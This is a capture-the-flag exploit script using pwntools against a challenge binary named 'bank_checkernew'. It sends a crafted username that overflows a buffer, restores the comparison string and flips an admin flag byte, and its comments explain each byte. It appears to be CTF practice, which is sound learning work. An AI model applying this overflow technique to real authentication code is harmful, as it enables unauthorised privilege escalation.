#!/usr/bin/env python3
from pwn import *

exe = ELF("./bank_checkernew")
context.binary = exe

if args.REMOTE:
    r = remote("chals.disorientation.cssa.club", 4312)
else:
    r = process(exe.path)
    if args.GDB:
        gdb.attach(r)

# Payload byte layout:
#   [0:6]   = "ZOOWEE"  -> my_copy matches for memcmp (left side)
#   [6:20]  = emoji filler (unicode 14 bytes total to fill the buffer)
#   [20:26] = "ZOOWEE"  -> RESTORES correct_username (right side of memcmp)
#   [26]    = 'A'       -> correct_username[6] (was null, doesn't affect memcmp len=6)
#   [27]    = 'A'       -> ADMIN_ALLOWED = 0x41 = TRUE (any none zero)

payload = ('ZOOWEE' + '🎉' * 3 + 'é' + 'ZOOWEEAA').encode('utf-8')
r.sendlineafter(b"username\n", payload)
print(r.recvall(timeout=3))
